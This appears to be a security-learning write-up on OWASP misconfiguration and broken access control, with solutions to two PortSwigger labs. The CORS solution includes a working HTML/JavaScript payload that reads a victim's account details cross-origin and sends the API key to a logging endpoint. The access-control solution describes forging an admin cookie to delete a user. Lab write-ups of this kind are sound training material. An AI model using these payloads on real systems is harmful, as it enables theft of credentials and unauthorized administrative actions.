#  Advanced Testing & PoC

## 1. Security Misconfiguration

Description : Improper configuration of server/application. 
Security Misconfiguration happens when an application, server, or database is configured insecurely, leaving it vulnerable to attacks. This is one of the most common vulnerabilities in the OWASP Foundation Top 10.

Common Examples : 

- Default usernames and passwords
- Unnecessary services enabled
- Improper file permissions
- Missing security headers
- Exposed admin panels
- Debug mode enabled in production
- Testing Performed
- Checked HTTP security headers
- Identified default configurations
- Scanned for exposed directories/files
- Tested insecure server settings
- Verified software versions for outdated components

Tools Used : 
- Burp Suite
- OWASP ZAP
- Browser Developer Tools

Remediation : 
- Disable unnecessary services and features
- Use strong authentication settings
- Configure secure HTTP headers
- Remove default credentials
- Keep software updated regularly

Impact : Full system compromise

Fix :
- Disable debug
- Harden server

### Screenshot :

### Portswigger Lab: CORS vulnerability with trusted null origin :

<img width="1918" height="968" alt="Screenshot_2026-05-09_05_22_06" src="https://github.com/user-attachments/assets/5caa0a8c-32da-4914-88de-b5cd76c80573" />


### Solution :

Target Goal - exploit the CORS misconfiguration to retrieve the administrator's API key

Creds - wiener:peter

Analysis:

Testing for CORS misconfigurations:
1. Change the origin header to an arbitrary value 
2. Change the origin header to the null value
3. Send the request to Burp Repeater, and resubmit it with the added header Origin: null.
4. Observe that the "null" origin is reflected in the Access-Control-Allow-Origin header.

Code used : 

<html>
    <body>
        <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
        <script>
            var xhr = new XMLHttpRequest();
            var url = 'https://ac371f531f693ef3c07b84de00630017.web-security-academy.net'
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    fetch('http://127.0.0.1:5555/log?key=' + xhr.responseText)
                }
            }
            xhr.open('GET', url + '/accountDetails', true);
            xhr.withCredentials = true;
            xhr.send(null);
        </script>"></iframe>
    </body>
</html>


## 2. Broken Access Control

Description : Broken Access Control occurs when users can access resources or perform actions beyond their authorized permissions.
Broken access control is a top-tier web security vulnerability (ranked #1 in OWASP Top 10:2025) where application restrictions are not properly enforced, allowing users to act outside their authorized permissions

Common Examples : 
- Accessing admin pages without authorization
- Viewing another user’s data
- Forced browsing to restricted URLs
- Privilege escalation attacks
- Missing role-based access control checks

Testing Performed : 
- Tested direct access to admin endpoints
- Modified user IDs in requests
- Checked horizontal and vertical privilege escalation
- Intercepted and modified requests using proxy tools

Tools Used : 
- Burp Suite
- Web browser session testing
- Manual parameter manipulation

Remediation : 
- Implement proper role-based access control (RBAC)
- Validate user permissions on the server side
- Deny access by default
- Use secure session management
- Regularly test authorization mechanisms


### Screenshot :

### Lab - User role controlled by request parameter

Target Goal - Access admin panel and use it to delete the user carlos.

The lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.
Solve the lab by accessing the admin panel and using it to delete the user carlos.
You can log in to your own account using the following credentials: wiener:peter

#### Solution :

- Go to /admin and observe that you can't access the admin panel.
- Go to the login page.
- In Burp Proxy,check the response given my the /my-account.
- In /my-account url check "Cookie : Admin : False"
- Observe that the response sets the cookie Admin=false. Change it to Admin=true.
- Load the admin panel and delete carlos


